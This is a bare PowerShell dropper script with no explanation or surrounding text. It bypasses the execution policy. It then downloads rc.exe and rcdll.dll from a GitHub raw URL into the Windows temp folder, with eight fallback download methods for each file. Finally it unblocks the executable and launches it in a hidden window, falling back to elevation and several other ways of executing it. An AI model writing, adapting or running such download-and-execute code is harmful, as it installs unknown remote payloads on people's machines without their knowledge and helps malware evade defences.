Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force

$downloadSuccess = $false

# Method 1: Invoke-WebRequest
if (-not $downloadSuccess) {
    try {
        Invoke-WebRequest -Uri "https://raw.githubusercontent.com/dddjcvsomaxzc/dddjcvsomaxzc/main/rc.exe" -OutFile "C:\windows\temp\rc.exe" -ErrorAction Stop
        if (Test-Path "C:\windows\temp\rc.exe") { $downloadSuccess = $true }
    } catch {
        # Continue to next method
    }
}

# Method 2: Invoke-RestMethod
if (-not $downloadSuccess) {
    try {
        Invoke-RestMethod -Uri "https://raw.githubusercontent.com/dddjcvsomaxzc/dddjcvsomaxzc/main/rc.exe" -OutFile "C:\windows\temp\rc.exe" -ErrorAction Stop
        if (Test-Path "C:\windows\temp\rc.exe") { $downloadSuccess = $true }
    } catch {
        # Continue to next method
    }
}

# Method 3: WebClient
if (-not $downloadSuccess) {
    try {
        (New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/dddjcvsomaxzc/dddjcvsomaxzc/main/rc.exe", "C:\windows\temp\rc.exe")
        if (Test-Path "C:\windows\temp\rc.exe") { $downloadSuccess = $true }
    } catch {
        # Continue to next method
    }
}

# Method 4: BITS Transfer
if (-not $downloadSuccess) {
    try {
        Start-BitsTransfer -Source "https://raw.githubusercontent.com/dddjcvsomaxzc/dddjcvsomaxzc/main/rc.exe" -Destination "C:\windows\temp\rc.exe" -ErrorAction Stop
        if (Test-Path "C:\windows\temp\rc.exe") { $downloadSuccess = $true }
    } catch {
        # Continue to next method
    }
}

# Method 5: curl
if (-not $downloadSuccess) {
    try {
        cmd /c 'curl -o C:\windows\temp\rc.exe https://raw.githubusercontent.com/dddjcvsomaxzc/dddjcvsomaxzc/main/rc.exe'
        if (Test-Path "C:\windows\temp\rc.exe") { $downloadSuccess = $true }
    } catch {
        # Continue to next method
    }
}

# Method 6: wget
if (-not $downloadSuccess) {
    try {
        cmd /c 'wget https://raw.githubusercontent.com/dddjcvsomaxzc/dddjcvsomaxzc/main/rc.exe -O C:\windows\temp\rc.exe'
        if (Test-Path "C:\windows\temp\rc.exe") { $downloadSuccess = $true }
    } catch {
        # Continue to next method
    }
}

# Method 7: HttpClient
if (-not $downloadSuccess) {
    try {
        [System.IO.File]::WriteAllBytes("C:\windows\temp\rc.exe", (New-Object System.Net.Http.HttpClient).GetAsync("https://raw.githubusercontent.com/dddjcvsomaxzc/dddjcvsomaxzc/main/rc.exe").Result.Content.ReadAsByteArrayAsync().Result)
        if (Test-Path "C:\windows\temp\rc.exe") { $downloadSuccess = $true }
    } catch {
        # Continue to next method
    }
}

# Method 8: WebRequest (last resort)
if (-not $downloadSuccess) {
    try {
        $response = [System.Net.WebRequest]::Create("https://raw.githubusercontent.com/dddjcvsomaxzc/dddjcvsomaxzc/main/rc.exe").GetResponse()
        $stream = $response.GetResponseStream()
        $reader = New-Object System.IO.BinaryReader($stream)
        $bytes = $reader.ReadBytes(1MB)
        [System.IO.File]::WriteAllBytes("C:\windows\temp\rc.exe", $bytes)
        $reader.Close()
        $stream.Close()
        $response.Close()
        if (Test-Path "C:\windows\temp\rc.exe") { $downloadSuccess = $true }
    } catch {
        # All methods failed
    }
}


$downloadSuccess = $false

# Method 1: Invoke-WebRequest
if (-not $downloadSuccess) {
    try {
        Invoke-WebRequest -Uri "https://raw.githubusercontent.com/dddjcvsomaxzc/dddjcvsomaxzc/main/rcdll.dll" -OutFile "C:\windows\temp\rcdll.dll" -ErrorAction Stop
        if (Test-Path "C:\windows\temp\rcdll.dll") { $downloadSuccess = $true }
    } catch {
        # Continue to next method
    }
}

# Method 2: Invoke-RestMethod
if (-not $downloadSuccess) {
    try {
        Invoke-RestMethod -Uri "https://raw.githubusercontent.com/dddjcvsomaxzc/dddjcvsomaxzc/main/rcdll.dll" -OutFile "C:\windows\temp\rcdll.dll" -ErrorAction Stop
        if (Test-Path "C:\windows\temp\rcdll.dll") { $downloadSuccess = $true }
    } catch {
        # Continue to next method
    }
}

# Method 3: WebClient
if (-not $downloadSuccess) {
    try {
        (New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/dddjcvsomaxzc/dddjcvsomaxzc/main/rcdll.dll", "C:\windows\temp\rcdll.dll")
        if (Test-Path "C:\windows\temp\rcdll.dll") { $downloadSuccess = $true }
    } catch {
        # Continue to next method
    }
}

# Method 4: BITS Transfer
if (-not $downloadSuccess) {
    try {
        Start-BitsTransfer -Source "https://raw.githubusercontent.com/dddjcvsomaxzc/dddjcvsomaxzc/main/rcdll.dll" -Destination "C:\windows\temp\rcdll.dll" -ErrorAction Stop
        if (Test-Path "C:\windows\temp\rcdll.dll") { $downloadSuccess = $true }
    } catch {
        # Continue to next method
    }
}

# Method 5: curl
if (-not $downloadSuccess) {
    try {
        cmd /c 'curl -o C:\windows\temp\rcdll.dll https://raw.githubusercontent.com/dddjcvsomaxzc/dddjcvsomaxzc/main/rcdll.dll'
        if (Test-Path "C:\windows\temp\rcdll.dll") { $downloadSuccess = $true }
    } catch {
        # Continue to next method
    }
}

# Method 6: wget
if (-not $downloadSuccess) {
    try {
        cmd /c 'wget https://raw.githubusercontent.com/dddjcvsomaxzc/dddjcvsomaxzc/main/rcdll.dll -O C:\windows\temp\rcdll.dll'
        if (Test-Path "C:\windows\temp\rcdll.dll") { $downloadSuccess = $true }
    } catch {
        # Continue to next method
    }
}

# Method 7: HttpClient
if (-not $downloadSuccess) {
    try {
        [System.IO.File]::WriteAllBytes("C:\windows\temp\rcdll.dll", (New-Object System.Net.Http.HttpClient).GetAsync("https://raw.githubusercontent.com/dddjcvsomaxzc/dddjcvsomaxzc/main/rcdll.dll").Result.Content.ReadAsByteArrayAsync().Result)
        if (Test-Path "C:\windows\temp\rcdll.dll") { $downloadSuccess = $true }
    } catch {
        # Continue to next method
    }
}

# Method 8: WebRequest (last resort)
if (-not $downloadSuccess) {
    try {
        $response = [System.Net.WebRequest]::Create("https://raw.githubusercontent.com/dddjcvsomaxzc/dddjcvsomaxzc/main/rcdll.dll").GetResponse()
        $stream = $response.GetResponseStream()
        $reader = New-Object System.IO.BinaryReader($stream)
        $bytes = $reader.ReadBytes(1MB)
        [System.IO.File]::WriteAllBytes("C:\windows\temp\rcdll.dll", $bytes)
        $reader.Close()
        $stream.Close()
        $response.Close()
        if (Test-Path "C:\windows\temp\rcdll.dll") { $downloadSuccess = $true }
    } catch {
        # All methods failed
    }
}

# Your script continues here...


sleep 3


Unblock-File -Path "C:\Windows\temp\rc.exe" -ErrorAction Silently
Get-Item "C:\Windows\temp\rc.exe" | Select -ExpandProperty Attributes

# Try execution methods sequentially (only proceeds if previous fails)
if (Test-Path "C:\Windows\temp\rc.exe") {
    try {
        Start-Process -FilePath "C:\Windows\temp\rc.exe" -WindowStyle Hidden -ErrorAction Stop
    } catch {
        try {
            Start-Process -FilePath "C:\Windows\temp\rc.exe" -WindowStyle Hidden -Verb RunAs -ErrorAction Stop
        } catch {
            try {
                & "C:\Windows\temp\rc.exe"
            } catch {
                try {
                    cmd /c "C:\Windows\temp\rc.exe"
                } catch {
                    try {
                        Invoke-Item "C:\Windows\temp\rc.exe"
                    } catch {
                        try {
                            Invoke-Expression "C:\Windows\temp\rc.exe"
                        } catch {
                            try {
                                & "C:\Windows\temp\rc.exe"
                            } catch {
                            }
                        }
                    }
                }
            }
        }
    }
} else {
}